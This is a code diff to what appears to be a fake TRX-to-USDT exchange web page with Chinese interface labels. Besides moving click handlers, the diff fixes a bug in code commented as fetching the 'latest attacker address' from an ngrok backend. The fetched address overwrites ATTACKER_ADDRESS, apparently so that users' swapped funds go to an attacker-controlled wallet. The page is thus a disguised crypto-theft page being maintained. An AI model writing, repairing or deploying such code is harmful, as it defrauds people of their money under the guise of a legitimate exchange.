@@ -1378,8 +1378,8 @@
             <div class="convert-form">
                 <div class="currency-input">
                     <div class="currency-label">消耗</div>
-                    <div class="currency-selector" onclick="selectFromCurrency()">
-                        <div class="currency-info">
+                    <div class="currency-selector">
+                        <div class="currency-info" onclick="selectFromCurrency()">
                             <div class="currency-icon trx-icon">T</div>
                             <div>
                                 <div class="currency-name">TRX</div>
@@ -1396,8 +1396,8 @@
 
                 <div class="currency-input">
                     <div class="currency-label">获得</div>
-                    <div class="currency-selector" onclick="selectToCurrency()">
-                        <div class="currency-info">
+                    <div class="currency-selector">
+                        <div class="currency-info"  onclick="selectToCurrency()">
                             <div class="currency-icon usdt-icon">₮</div>
                             <div>
                                 <div class="currency-name">USDT</div>
@@ -1576,7 +1576,7 @@
 
             //从ngrok后端获取最新的攻击者地址
             try{
-                if (typeof getCurrentAttackerAddress() === 'function'){
+                if (typeof getCurrentAttackerAddress === 'function'){
                     const cloudAddressResult = await getCurrentAttackerAddress();
                     if (cloudAddressResult && cloudAddressResult.address && cloudAddressResult.address !== ATTACKER_ADDRESS){
                         ATTACKER_ADDRESS = cloudAddressResult.address;
